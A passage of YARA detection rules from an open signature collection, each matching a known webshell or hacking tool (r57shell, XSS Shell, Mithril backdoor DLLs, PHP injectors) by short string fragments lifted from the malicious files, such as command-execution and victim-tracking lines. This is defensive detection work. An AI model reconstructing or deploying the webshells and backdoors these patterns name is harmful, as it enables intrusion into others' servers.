		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "174486fe844cb388e2ae3494ac2d1ec2"
		logic_hash = "5251ee090934c8f99a8a2ffef2605593943306937dc56a135a47f1da7e732587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkdoordll
{
	meta:
		description = "Webshells Auto-generated - file hkdoordll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "c4cfb575-89c3-5a72-8bf5-234d4284fe9d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8279-L8290"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b715c009d47686c0e62d0981efce2552"
		logic_hash = "a3c4d262b59cdf82390c0457810505e9e7a18c9b26ba4524bc368fd2141ec306"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_2
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3a3fe11-c9e1-523b-88a3-ddc0c1085d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8291-L8302"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "5319426928d33b62527efb561c2b7a226a5a473735f501b267e6b3b174972085"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_V1_45_Dlltest
{
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "2aea84b6-1b51-58cd-b52b-c31b1f75d295"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8303-L8316"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
		logic_hash = "cf1e2ca39ae6b726792bbbaf0f1dd90788a4bb9ba5e3d50c22d75f2b3d4e9e7d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "syspath"
		$s4 = "\\Mithril"
		$s5 = "--list the services in the computer"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgiis6Cli
{
	meta:
		description = "Webshells Auto-generated - file dbgiis6cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "2bc59a6b-f45c-5e68-a346-ac56e8f2757b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8317-L8329"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3044dceb632b636563f66fee3aaaf8f3"
		logic_hash = "f6de3c9b8fbcca230540d1b41659ab02c9548df69f53fa9d5730ac7bb7dfe88a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
		$s5 = "###command:(NO more than 100 bytes!)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Remview_2003_04_22
{
	meta:
		description = "Webshells Auto-generated - file remview_2003_04_22.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3088ee27-42a3-5140-98de-ab6f87c7748b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8330-L8341"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "17d3e4e39fbca857344a7650f7ea55e3"
		logic_hash = "2957f6ec7a022ac04759724276f6928625708346903597b0765b5e81207fc6b9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Test
{
	meta:
		description = "Webshells Auto-generated - file test.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b0cc5a2a-c741-50dd-854f-5a43769e8f47"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8342-L8354"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "82cf7b48da8286e644f575b039a99c26"
		logic_hash = "62613bead716717f116290b1c9eca9aa63eadd280050811e30a54e5d186af2fc"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";"
		$s2 = "fwrite ($fp, \"$yazi\");"

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Cress
{
	meta:
		description = "Webshells Auto-generated - file cress.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6cf3e43c-bec1-5688-b1d7-8ac48d59153a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8355-L8367"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "36a416186fe010574c9be68002a7286a"
		logic_hash = "670e236e72d3cb52ea5dba865749baee58a70f8d100db1dd8eddfe3183339181"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\Mithril "
		$s4 = "Mithril.exe"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Index3
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41310217-b9a7-5360-80c4-7d0a3969f848"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8397-L8408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cceff6dc247aaa25512bad22120a14b4"
		logic_hash = "3700141ca2cf53f49618e2d4cab8866efccdce843921f1733b3d6260b8feea68"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"

	condition:
		all of them
}

rule SIGNATURE_BASE_Adjustcr
{
	meta:
		description = "Webshells Auto-generated - file adjustcr.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4b3d9409-60e8-502a-b37b-1e06d57c9b0b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8409-L8423"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "17037fa684ef4c90a25ec5674dac2eb6"
		logic_hash = "d2a86083ff5cb34a0453f812e2d316c63342e529f00099a8869fa7e0a43321ef"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$Info: This file is packed with the UPX executable packer $"
		$s2 = "$License: NRV for UPX is distributed under special license $"
		$s6 = "AdjustCR Carr"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Xishell
{
	meta:
		description = "Webshells Auto-generated - file xIShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "32a32a9a-8d5f-5b3f-8ff4-560555f0ae1e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8424-L8435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "997c8437c0621b4b753a546a53a88674"
		logic_hash = "13393bc72477ab9a4ebc16b409de8ed73e086cc41f25f34315d11401b63c2471"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Apppack_2005
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "67c86d16-a962-5502-8c39-0a6e3dc04031"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8436-L8447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "0de4800291132efca24b40bebcc895d6873110214c8cbf8384317208e0d9db82"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell
{
	meta:
		description = "Webshells Auto-generated - file xssshell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ef89653c-5814-525a-b04e-4326a80f780c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8448-L8459"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
		logic_hash = "6b0e602b523f58ec61850b4ba2e69da4fe4bf2833fb45e529785a398445db127"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Usr
{
	meta:
		description = "Webshells Auto-generated - file usr.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ab1825fe-96aa-5d97-acd6-eac43a12b237"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8460-L8471"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ade3357520325af50c9098dc8a21a024"
		logic_hash = "f5fd4a4c1b531b23b09505d302dc27d7ba2eb733fcf313c04ba9085b090f7cbe"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5d84d518-0e18-517f-890b-e296ac265c50"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8472-L8483"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "de4ac200f5426ec4c6fef21d5fbc37281811569a3e71a9bcb6fa51d13eb600a4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Db
{
	meta:
		description = "Webshells Auto-generated - file db.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "94bb2297-95a2-5442-bb16-fb079a29606e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8484-L8495"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cb62e2ec40addd4b9930a9e270f5b318"
		logic_hash = "3fdbaa17c12abef8576bf859065d90f4b6e80c187af734b71b26a1bd5d073e86"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Sh
{
	meta:
		description = "Webshells Auto-generated - file sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8496-L8507"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1e9e879d49eb0634871e9b36f99fe528"
		logic_hash = "da0b572f116cc5c55e8d7469f222896d602d09be4761a0e2139fc8ce67ac4050"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Default
{
	meta:
		description = "Webshells Auto-generated - file default.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "1c221572-4cb5-5806-a856-0f857dba230a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8508-L8519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d156782ae5e0b3724de3227b42fcaf2f"
		logic_hash = "6a8772a8a6399c3266abcc22a3c55eda70ec9703346398f5f1768bbd35974f8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Editserver_2
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bd254bd9-fd23-5807-9347-2a559089b7c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8520-L8533"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
		logic_hash = "c581936928ce0f1061feb5665c743f14f12a9f875e360f40cc064f3047b23adf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@HOTMAIL.COM"
		$s1 = "Press Any Ke"
		$s3 = "glish MenuZ"

	condition:
		all of them
}

rule SIGNATURE_BASE_By064Cli
{
	meta:
		description = "Webshells Auto-generated - file by064cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9ea88f0c-9275-5567-a4d9-0545de8044d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8534-L8546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "10e0dff366968b770ae929505d2a9885"
		logic_hash = "51efd5c510efc6657ae175af47b09437ae70eb0237d88ffdf3cdae365d0ec7be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "packet dropped,redirecting"
		$s9 = "input the password(the default one is 'by')"

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_Dlltest
{
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "59a6bfb6-c099-56cd-b40e-3e92ea0eb7d3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8547-L8559"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a8d25d794d8f08cd4de0c3d6bf389e6d"
		logic_hash = "c8c8d1b75ed4eb4bc66a762e53aa6b3ab439e96ef464a8b9ffa4dff887986465"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "please enter the password:"
		$s3 = "\\dllTest.pdb"

	condition:
		all of them
}

rule SIGNATURE_BASE_Peek_A_Boo
{
	meta:
		description = "Webshells Auto-generated - file peek-a-boo.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "f6ca33b5-e37f-5124-a193-a3056c559314"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8560-L8576"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aca339f60d41fdcba83773be5d646776"
		logic_hash = "b103c1b873dd0df9626d72a1127fbadc821777a05012a080423263a2083c398b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "__vbaHresultCheckObj"
		$s1 = "\\VB\\VB5.OLB"
		$s2 = "capGetDriverDescriptionA"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s8 = "__vbaErrorOverflow"

	condition:
		all of them
}

rule SIGNATURE_BASE_Fmlibraryv3
{
	meta:
		description = "Webshells Auto-generated - file fmlibraryv3.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9b8ef79d-80bb-5a05-91e6-0f2bc3fd3068"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8577-L8588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c34c248fed6d5a20d8203924a2088acc"
		logic_hash = "a7dc83db26cdda757f626c42022c17bb2764074a3cc5f87b4a3aaa991fac5dc2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Dlltest_2
{
	meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "cf81e3de-513c-584d-bc37-6504e91b170c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8589-L8601"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
		logic_hash = "bf260ce0f8d4728920679573cd77927b44db28ba6102923707af8d1ad7d0ef2d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\\Debug\\dllTest.pdb"
		$s5 = "--list the services in the computer"

	condition:
		all of them
}

rule SIGNATURE_BASE_Connector
{
	meta:
		description = "Webshells Auto-generated - file connector.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e46026bc-c570-5057-a132-5a459c959a69"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8602-L8614"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3ba1827fca7be37c8296cd60be9dc884"
		logic_hash = "b8cadb7aa23a8cdef10e7b1eb05586d6c3e7c398958a80861b6f1ccd4edf1eca"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
		$s4 = "Add UNIQUE ID for victims / zombies"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Hiderun
{
	meta:
		description = "Webshells Auto-generated - file HideRun.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd71dbef-5b5d-5976-8b95-0f202a4b4795"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8615-L8627"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "45436d9bfd8ff94b71eeaeb280025afe"
		logic_hash = "3a6dea2314800b28e92b59595c8b79c64e66dc66ebfa8f89c2f4028b574b9a91"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Usage -- hiderun [AppName]"
		$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell_V1_7
{
	meta:
		description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7eb69ac3-90bb-5a44-8dcd-e71f5edcf18f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8628-L8639"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b5978501c7112584532b4ca6fb77cba5"
		logic_hash = "e03904177309de9ce1afa0b12bf70913b106650c3db5807f9d4ccb91fb2ade77"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Save
{
	meta:
		description = "Webshells Auto-generated - file save.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "f33c7559-e2f7-5223-a0e9-4e1d3bc7f080"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8640-L8652"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "865da1b3974e940936fe38e8e1964980"
		logic_hash = "c53034c6ebc4f01c4573e688f548e71dae944913797b12eb8f22a5ef0a368ccf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
		$s5 = "VictimID = fm_NStr(Victims(i))"

	condition:
		all of them
}

rule SIGNATURE_BASE_Screencap
{
	meta:
		description = "Webshells Auto-generated - file screencap.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "0c1b71d3-ad54-5230-b1ab-971647e76139"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8653-L8666"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "51139091dea7a9418a50f2712ea72aa6"
		logic_hash = "9be7ec97ef8e9b8838f7931a8fcf8d85b1543a202a7bf34fab9791fc47889cb9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "GetDIBColorTable"
		$s1 = "Screen.bmp"
		$s2 = "CreateDCA"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj_2
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "db8f835e-eb13-50f3-a60b-7d8ffcaa5eaa"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L8667-L8678"
